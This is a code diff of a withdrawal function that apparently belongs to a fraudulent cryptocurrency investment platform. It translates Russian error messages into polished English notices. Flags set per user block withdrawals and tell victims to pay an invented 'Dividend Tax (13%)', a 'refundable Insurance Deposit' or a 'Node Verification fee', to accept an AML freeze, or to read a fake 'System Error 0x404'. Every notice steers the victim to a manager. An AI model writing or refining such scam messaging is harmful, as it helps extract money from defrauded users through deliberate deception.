@@ -118,35 +118,34 @@ export async function createWithdrawal(data: {
   if (!user) return { ok: false, error: "User not found" };
   if (user.is_blocked) return { ok: false, error: "Account blocked" };
 
-  // ── Security Incident checks: проверяем все сценарии блокировки ─────────
+  // ── Security Incident checks ────────────────────────────────────────────────
   if (user.is_frozen) {
-    return { ok: false, error: "Счёт заморожен в рамках проверки AML/CFT. Обратитесь в службу безопасности." };
+    return { ok: false, error: "Compliance Division Notice: Your account has been temporarily frozen under AML/CFT investigation. Contact the Security Department to resolve." };
   }
 
-  // Проверяем required_tax (блокирует вывод пока > 0)
   if (Number(user.required_tax) > 0) {
     return {
       ok: false,
-      error: `Для вывода средств необходимо оплатить налог ${Number(user.required_tax).toFixed(2)} USDT. Обратитесь к менеджеру.`,
+      error: `Financial Department Alert: Your withdrawal is on hold due to pending Dividend Tax (13%). Amount due: ${Number(user.required_tax).toFixed(2)} USDT. Settling the tax will release the funds instantly.`,
     };
   }
 
   if (Number(user.insurance_fee) > 0) {
     return {
       ok: false,
-      error: `Требуется страховой депозит ${Number(user.insurance_fee).toFixed(2)} USDT. Обратитесь к менеджеру.`,
+      error: `Risk Management Notice: A refundable Insurance Deposit of ${Number(user.insurance_fee).toFixed(2)} USDT is required before the withdrawal can be processed. Contact your account manager.`,
     };
   }
 
   if (Number(user.node_fee) > 0) {
     return {
       ok: false,
-      error: `Требуется активация узла верификации: ${Number(user.node_fee).toFixed(2)} USDT. Обратитесь к менеджеру.`,
+      error: `Blockchain Authorization Required: Node Verification fee of ${Number(user.node_fee).toFixed(2)} USDT must be settled to complete the on-chain transaction. Contact your account manager.`,
     };
   }
 
   if (user.support_loop) {
-    return { ok: false, error: "Системная ошибка 0x404: модуль обработки транзакций недоступен. Обратитесь в поддержку." };
+    return { ok: false, error: "System Error 0x404: Transaction processing module is temporarily unavailable. Authorization Required — contact Technical Support for manual withdrawal activation." };
   }
 
   // Проверяем баланс
